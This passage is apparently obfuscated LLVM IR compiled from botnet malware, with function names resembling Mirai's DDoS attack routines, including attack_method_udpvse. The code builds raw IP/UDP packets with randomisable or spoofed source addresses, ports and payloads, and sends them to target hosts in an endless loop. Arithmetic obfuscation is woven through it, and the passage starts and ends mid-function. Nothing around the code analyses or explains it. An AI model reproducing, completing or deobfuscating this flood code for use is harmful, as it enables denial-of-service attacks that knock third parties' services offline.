  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %363

; <label>:76:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 %77, i32 0, i32 3, i8* %78, i32 4) #6
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  br label %363

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

; <label>:85:                                     ; preds = %205, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %211

; <label>:90:                                     ; preds = %85
  %91 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = xor i8 %107, -1
  %109 = xor i8 15, -1
  %110 = xor i8 -39, -1
  %111 = or i8 %108, %109
  %112 = or i8 -39, %110
  %113 = xor i8 %111, -1
  %114 = and i8 %113, %112
  %115 = and i8 %107, 15
  %116 = and i8 %114, 64
  %117 = xor i8 %114, 64
  %118 = or i8 %116, %117
  %119 = or i8 %114, 64
  store i8 %118, i8* %106, align 4
  %120 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %121 = bitcast %struct.iphdr* %120 to i8*
  %122 = load i8, i8* %121, align 4
  %123 = xor i8 %122, -1
  %124 = xor i8 -16, -1
  %125 = xor i8 -7, -1
  %126 = or i8 %123, %124
  %127 = or i8 -7, %125
  %128 = xor i8 %126, -1
  %129 = and i8 %128, %127
  %130 = and i8 %122, -16
  %131 = xor i8 %129, -1
  %132 = xor i8 5, -1
  %133 = xor i8 -24, -1
  %134 = and i8 %131, -24
  %135 = and i8 %129, %133
  %136 = and i8 %132, -24
  %137 = and i8 5, %133
  %138 = or i8 %134, %135
  %139 = or i8 %136, %137
  %140 = xor i8 %138, %139
  %141 = or i8 %131, %132
  %142 = xor i8 %141, -1
  %143 = or i8 -24, %133
  %144 = and i8 %142, %143
  %145 = or i8 %140, %144
  %146 = or i8 %129, 5
  store i8 %145, i8* %121, align 4
  %147 = load i8, i8* %12, align 1
  %148 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %149 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %148, i32 0, i32 1
  store i8 %147, i8* %149, align 1
  %150 = load i16, i16* %18, align 2
  %151 = zext i16 %150 to i64
  %152 = sub i64 0, 28
  %153 = sub i64 0, %151
  %154 = add i64 %152, %153
  %155 = sub i64 0, %154
  %156 = add i64 28, %151
  %157 = trunc i64 %155 to i16
  %158 = call zeroext i16 @htons(i16 zeroext %157) #7
  %159 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 2
  store i16 %158, i16* %160, align 2
  %161 = load i16, i16* %13, align 2
  %162 = call zeroext i16 @htons(i16 zeroext %161) #7
  %163 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %164 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %163, i32 0, i32 3
  store i16 %162, i16* %164, align 4
  %165 = load i8, i8* %14, align 1
  %166 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 5
  store i8 %165, i8* %167, align 4
  %168 = load i8, i8* %15, align 1
  %169 = icmp ne i8 %168, 0
  br i1 %169, label %170, label %174

; <label>:170:                                    ; preds = %90
  %171 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %172 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %173 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %172, i32 0, i32 4
  store i16 %171, i16* %173, align 2
  br label %174

; <label>:174:                                    ; preds = %170, %90
  %175 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 6
  store i8 17, i8* %176, align 1
  %177 = load i32, i32* %20, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 8
  store i32 %177, i32* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 1
  %185 = load i32, i32* %184, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 9
  store i32 %185, i32* %187, align 4
  %188 = load i16, i16* %16, align 2
  %189 = call zeroext i16 @htons(i16 zeroext %188) #7
  %190 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %191 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %190, i32 0, i32 0
  store i16 %189, i16* %191, align 2
  %192 = load i16, i16* %17, align 2
  %193 = call zeroext i16 @htons(i16 zeroext %192) #7
  %194 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %195 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %194, i32 0, i32 1
  store i16 %193, i16* %195, align 2
  %196 = load i16, i16* %18, align 2
  %197 = zext i16 %196 to i64
  %198 = sub i64 0, %197
  %199 = sub i64 8, %198
  %200 = add i64 8, %197
  %201 = trunc i64 %199 to i16
  %202 = call zeroext i16 @htons(i16 zeroext %201) #7
  %203 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %204 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %203, i32 0, i32 2
  store i16 %202, i16* %204, align 2
  br label %205

; <label>:205:                                    ; preds = %174
  %206 = load i32, i32* %9, align 4
  %207 = add i32 %206, 691870359
  %208 = add i32 %207, 1
  %209 = sub i32 %208, 691870359
  %210 = add nsw i32 %206, 1
  store i32 %209, i32* %9, align 4
  br label %85

; <label>:211:                                    ; preds = %85
  br label %212

; <label>:212:                                    ; preds = %362, %211
  store i32 0, i32* %9, align 4
  br label %213

; <label>:213:                                    ; preds = %356, %212
  %214 = load i32, i32* %9, align 4
  %215 = load i8, i8* %5, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp slt i32 %214, %216
  br i1 %217, label %218, label %362

; <label>:218:                                    ; preds = %213
  %219 = load i8**, i8*** %11, align 8
  %220 = load i32, i32* %9, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds i8*, i8** %219, i64 %221
  %223 = load i8*, i8** %222, align 8
  store i8* %223, i8** %23, align 8
  %224 = load i8*, i8** %23, align 8
  %225 = bitcast i8* %224 to %struct.iphdr*
  store %struct.iphdr* %225, %struct.iphdr** %24, align 8
  %226 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i64 1
  %228 = bitcast %struct.iphdr* %227 to %struct.udphdr*
  store %struct.udphdr* %228, %struct.udphdr** %25, align 8
  %229 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %230 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %229, i64 1
  %231 = bitcast %struct.udphdr* %230 to i8*
  store i8* %231, i8** %26, align 8
  %232 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %233 = load i32, i32* %9, align 4
  %234 = sext i32 %233 to i64
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %232, i64 %234
  %236 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %235, i32 0, i32 2
  %237 = load i8, i8* %236, align 4
  %238 = zext i8 %237 to i32
  %239 = icmp slt i32 %238, 32
  br i1 %239, label %240, label %264

; <label>:240:                                    ; preds = %218
  %241 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %242 = load i32, i32* %9, align 4
  %243 = sext i32 %242 to i64
  %244 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %241, i64 %243
  %245 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %244, i32 0, i32 1
  %246 = load i32, i32* %245, align 4
  %247 = call i32 @ntohl(i32 %246) #7
  %248 = call i32 @rand_next()
  %249 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %250 = load i32, i32* %9, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %249, i64 %251
  %253 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %252, i32 0, i32 2
  %254 = load i8, i8* %253, align 4
  %255 = zext i8 %254 to i32
  %256 = lshr i32 %248, %255
  %257 = add i32 %247, -1775048407
  %258 = add i32 %257, %256
  %259 = sub i32 %258, -1775048407
  %260 = add i32 %247, %256
  %261 = call i32 @htonl(i32 %259) #7
  %262 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 9
  store i32 %261, i32* %263, align 4
  br label %264

; <label>:264:                                    ; preds = %240, %218
  %265 = load i32, i32* %20, align 4
  %266 = icmp eq i32 %265, -1
  br i1 %266, label %267, label %271

; <label>:267:                                    ; preds = %264
  %268 = call i32 @rand_next()
  %269 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 8
  store i32 %268, i32* %270, align 4
  br label %271

; <label>:271:                                    ; preds = %267, %264
  %272 = load i16, i16* %13, align 2
  %273 = zext i16 %272 to i32
  %274 = icmp eq i32 %273, 65535
  br i1 %274, label %275, label %280

; <label>:275:                                    ; preds = %271
  %276 = call i32 @rand_next()
  %277 = trunc i32 %276 to i16
  %278 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %279 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %278, i32 0, i32 3
  store i16 %277, i16* %279, align 4
  br label %280

; <label>:280:                                    ; preds = %275, %271
  %281 = load i16, i16* %16, align 2
  %282 = zext i16 %281 to i32
  %283 = icmp eq i32 %282, 65535
  br i1 %283, label %284, label %289

; <label>:284:                                    ; preds = %280
  %285 = call i32 @rand_next()
  %286 = trunc i32 %285 to i16
  %287 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %288 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %287, i32 0, i32 0
  store i16 %286, i16* %288, align 2
  br label %289

; <label>:289:                                    ; preds = %284, %280
  %290 = load i16, i16* %17, align 2
  %291 = zext i16 %290 to i32
  %292 = icmp eq i32 %291, 65535
  br i1 %292, label %293, label %298

; <label>:293:                                    ; preds = %289
  %294 = call i32 @rand_next()
  %295 = trunc i32 %294 to i16
  %296 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 1
  store i16 %295, i16* %297, align 2
  br label %298

; <label>:298:                                    ; preds = %293, %289
  %299 = load i8, i8* %19, align 1
  %300 = icmp ne i8 %299, 0
  br i1 %300, label %301, label %305

; <label>:301:                                    ; preds = %298
  %302 = load i8*, i8** %26, align 8
  %303 = load i16, i16* %18, align 2
  %304 = zext i16 %303 to i32
  call void @rand_str(i8* %302, i32 %304)
  br label %305

; <label>:305:                                    ; preds = %301, %298
  %306 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 7
  store i16 0, i16* %307, align 2
  %308 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %309 = bitcast %struct.iphdr* %308 to i16*
  %310 = call zeroext i16 @checksum_generic(i16* %309, i32 20)
  %311 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %312 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %311, i32 0, i32 7
  store i16 %310, i16* %312, align 2
  %313 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %314 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %313, i32 0, i32 3
  store i16 0, i16* %314, align 2
  %315 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %316 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %317 = bitcast %struct.udphdr* %316 to i8*
  %318 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %319 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %318, i32 0, i32 2
  %320 = load i16, i16* %319, align 2
  %321 = load i16, i16* %18, align 2
  %322 = zext i16 %321 to i64
  %323 = sub i64 0, %322
  %324 = sub i64 8, %323
  %325 = add i64 8, %322
  %326 = trunc i64 %324 to i32
  %327 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %315, i8* %317, i16 zeroext %320, i32 %326)
  %328 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %329 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %328, i32 0, i32 3
  store i16 %327, i16* %329, align 2
  %330 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %331 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %330, i32 0, i32 1
  %332 = load i16, i16* %331, align 2
  %333 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %334 = load i32, i32* %9, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %333, i64 %335
  %337 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %336, i32 0, i32 0
  %338 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %337, i32 0, i32 1
  store i16 %332, i16* %338, align 2
  %339 = load i32, i32* %10, align 4
  %340 = load i8*, i8** %23, align 8
  %341 = load i16, i16* %18, align 2
  %342 = zext i16 %341 to i64
  %343 = sub i64 0, %342
  %344 = sub i64 28, %343
  %345 = add i64 28, %342
  %346 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %347 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %348 = load i32, i32* %9, align 4
  %349 = sext i32 %348 to i64
  %350 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %347, i64 %349
  %351 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i32 0, i32 0
  %352 = bitcast %struct.sockaddr_in* %351 to %struct.sockaddr*
  store %struct.sockaddr* %352, %struct.sockaddr** %346, align 8
  %353 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %354 = load %struct.sockaddr*, %struct.sockaddr** %353, align 8
  %355 = call i64 @sendto(i32 %339, i8* %340, i64 %344, i32 16384, %struct.sockaddr* %354, i32 16)
  br label %356

; <label>:356:                                    ; preds = %305
  %357 = load i32, i32* %9, align 4
  %358 = add i32 %357, 1602198824
  %359 = add i32 %358, 1
  %360 = sub i32 %359, 1602198824
  %361 = add nsw i32 %357, 1
  store i32 %360, i32* %9, align 4
  br label %213

; <label>:362:                                    ; preds = %213
  br label %212

; <label>:363:                                    ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %350

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %350

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %206, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %212

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #6
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = xor i8 %93, -1
  %95 = xor i8 15, -1
  %96 = xor i8 -5, -1
  %97 = or i8 %94, %95
  %98 = or i8 -5, %96
  %99 = xor i8 %97, -1
  %100 = and i8 %99, %98
  %101 = and i8 %93, 15
  %102 = xor i8 %100, -1
  %103 = xor i8 64, -1
  %104 = xor i8 -43, -1
  %105 = and i8 %102, -43
  %106 = and i8 %100, %104
  %107 = and i8 %103, -43
  %108 = and i8 64, %104
  %109 = or i8 %105, %106
  %110 = or i8 %107, %108
  %111 = xor i8 %109, %110
  %112 = or i8 %102, %103
  %113 = xor i8 %112, -1
  %114 = or i8 -43, %104
  %115 = and i8 %113, %114
  %116 = or i8 %111, %115
  %117 = or i8 %100, 64
  store i8 %116, i8* %92, align 4
  %118 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %119 = bitcast %struct.iphdr* %118 to i8*
  %120 = load i8, i8* %119, align 4
  %121 = xor i8 -16, -1
  %122 = xor i8 %120, %121
  %123 = and i8 %122, %120
  %124 = and i8 %120, -16
  %125 = xor i8 %123, -1
  %126 = xor i8 5, -1
  %127 = xor i8 -28, -1
  %128 = and i8 %125, -28
  %129 = and i8 %123, %127
  %130 = and i8 %126, -28
  %131 = and i8 5, %127
  %132 = or i8 %128, %129
  %133 = or i8 %130, %131
  %134 = xor i8 %132, %133
  %135 = or i8 %125, %126
  %136 = xor i8 %135, -1
  %137 = or i8 -28, %127
  %138 = and i8 %136, %137
  %139 = or i8 %134, %138
  %140 = or i8 %123, 5
  store i8 %139, i8* %119, align 4
  %141 = load i8, i8* %12, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = load i32, i32* %19, align 4
  %145 = sext i32 %144 to i64
  %146 = add i64 32, 4520412178842848696
  %147 = add i64 %146, %145
  %148 = sub i64 %147, 4520412178842848696
  %149 = add i64 32, %145
  %150 = trunc i64 %148 to i16
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 2
  store i16 %151, i16* %153, align 2
  %154 = load i16, i16* %13, align 2
  %155 = call zeroext i16 @htons(i16 zeroext %154) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 3
  store i16 %155, i16* %157, align 4
  %158 = load i8, i8* %14, align 1
  %159 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 5
  store i8 %158, i8* %160, align 4
  %161 = load i8, i8* %15, align 1
  %162 = icmp ne i8 %161, 0
  br i1 %162, label %163, label %167

; <label>:163:                                    ; preds = %73
  %164 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 4
  store i16 %164, i16* %166, align 2
  br label %167

; <label>:167:                                    ; preds = %163, %73
  %168 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 6
  store i8 17, i8* %169, align 1
  %170 = load i32, i32* @LOCAL_ADDR, align 4
  %171 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 8
  store i32 %170, i32* %172, align 4
  %173 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 9
  store i32 %178, i32* %180, align 4
  %181 = load i16, i16* %16, align 2
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 0
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %17, align 2
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 1
  store i16 %186, i16* %188, align 2
  %189 = load i32, i32* %19, align 4
  %190 = sext i32 %189 to i64
  %191 = sub i64 12, 7947667483842978455
  %192 = add i64 %191, %190
  %193 = add i64 %192, 7947667483842978455
  %194 = add i64 12, %190
  %195 = trunc i64 %193 to i16
  %196 = call zeroext i16 @htons(i16 zeroext %195) #7
  %197 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %198 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %197, i32 0, i32 2
  store i16 %196, i16* %198, align 2
  %199 = load i8*, i8** %22, align 8
  %200 = bitcast i8* %199 to i32*
  store i32 -1, i32* %200, align 4
  %201 = load i8*, i8** %22, align 8
  %202 = getelementptr inbounds i8, i8* %201, i64 4
  store i8* %202, i8** %22, align 8
  %203 = load i8*, i8** %22, align 8
  %204 = load i8*, i8** %18, align 8
  %205 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %203, i8* %204, i32 %205)
  br label %206

; <label>:206:                                    ; preds = %167
  %207 = load i32, i32* %9, align 4
  %208 = sub i32 %207, -759464299
  %209 = add i32 %208, 1
  %210 = add i32 %209, -759464299
  %211 = add nsw i32 %207, 1
  store i32 %210, i32* %9, align 4
  br label %68

; <label>:212:                                    ; preds = %68
  br label %213

; <label>:213:                                    ; preds = %349, %212
  store i32 0, i32* %9, align 4
  br label %214

; <label>:214:                                    ; preds = %342, %213
